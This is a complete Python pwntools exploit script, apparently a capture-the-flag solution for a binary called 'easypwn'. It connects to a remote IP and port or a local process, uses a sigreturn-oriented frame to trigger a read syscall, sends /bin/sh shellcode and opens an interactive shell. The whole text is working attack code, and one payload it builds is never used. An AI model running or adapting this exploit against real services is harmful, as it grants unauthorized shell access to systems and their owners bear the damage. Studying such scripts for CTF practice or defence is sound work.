from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./easypwn")
else:
	p = remote("101.201.66.182","2234")

def debugf():
	gdb.attach(p,"b *0x40007a")

context.terminal = ["tmux","splitw","-v"]
context.arch = 'amd64'
context.log_level = 'debug'
#debugf()
syscall_ret = 0x40007a
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = 0x20
sigframe.rdx = 0x400
sigframe.rsp = 0x400085
sigframe.rip = syscall_ret
payload = str(sigframe)
p.send(payload)
raw_input()
payload = asm(shellcraft.sh())
payload = asm("sub esp,0x100") + payload
p.send(asm(shellcraft.sh()))
p.interactive()
